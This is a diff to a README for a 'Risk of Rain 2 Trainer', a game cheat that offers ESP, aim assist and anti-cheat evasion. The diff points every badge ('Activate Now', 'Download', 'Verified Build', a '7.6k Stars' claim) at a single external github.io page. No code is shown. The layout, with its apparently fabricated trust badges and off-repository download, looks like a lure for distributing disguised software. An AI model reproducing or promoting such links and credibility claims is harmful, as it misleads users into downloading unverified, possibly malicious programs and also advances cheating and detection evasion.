@@ -23,10 +23,10 @@ Unlike simple cheat engines, this trainer is **modular and configurable**. You c
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 7.6k Stars](https://img.shields.io/badge/GitHub-7.6k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://ror-2-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://ror-2-trainer.github.io/.github/)
+[![⭐️ 7.6k Stars](https://img.shields.io/badge/GitHub-7.6k_Stars-green?logo=github\&style=for-the-badge)](https://ror-2-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://ror-2-trainer.github.io/.github/)
 
 ---
 
@@ -157,8 +157,8 @@ A: It reduces detection, but no trainer is 100% undetectable.
 
 The **Risk of Rain 2 Trainer** gives players the upper hand with **ESP vision, aim assist, and loot awareness**. Whether you’re farming legendary drops, speed-running stages, or battling bosses, it’s built to keep you efficient and consistent.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://ror-2-trainer.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://ror-2-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://ror-2-trainer.github.io/.github/)
 
 ---
